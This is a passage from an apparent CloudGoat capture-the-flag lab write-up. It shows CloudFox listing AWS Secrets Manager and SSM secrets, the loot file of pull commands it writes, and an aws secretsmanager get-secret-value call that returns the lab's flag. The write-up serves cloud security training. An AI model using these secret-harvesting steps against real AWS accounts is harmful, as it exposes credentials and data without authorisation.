[secrets][REDACTED-AIDAW43MRFXB5YQGO4KP4] Enumerating secrets for account REDACTED.
[secrets][REDACTED-AIDAW43MRFXB5YQGO4KP4] Supported Services: SecretsManager, SSM Parameters
[secrets] Status: 42/42 tasks complete (8 errors -- For details check /home/dominic/.cloudfox/cloudfox-error.log)
[secrets] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/table/secrets.txt]
[secrets] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/csv/secrets.csv]
[secrets][REDACTED-AIDAW43MRFXB5YQGO4KP4] Loot written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/loot/pull-secrets-commands.txt]
[secrets][REDACTED-AIDAW43MRFXB5YQGO4KP4] 1 secrets found.
```

```bash
cat cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/loot/pull-secrets-commands.txt                           
#############################################
# The profile you will use to perform these commands is most likely not the profile you used to run CloudFox
# Set the $profile environment variable to the profile you are going to use to pull the secrets/parameters.
# E.g., export profile=dev-prod.
#############################################

aws --profile $profile --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgid73or123swp-final_flag
```

```bash
aws-vault exec bilbo -- aws --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgid73or123swp-final_flag
{
    "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgid73or123swp-final_flag-Sif8pD",
    "Name": "vulnerable_lambda_cgid73or123swp-final_flag",
    "VersionId": "4388D5FC-A56B-457A-8FF6-0D4CBBFF9CD1",
    "SecretString": "cg-secret-846237-284529",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-01-09T19:54:47.793000-05:00"
}
```

Happy (hacking\|hunting)!


# Resources
- https://github.com/RhinoSecurityLabs/cloudgoat
- https://github.com/BishopFox/cloudfox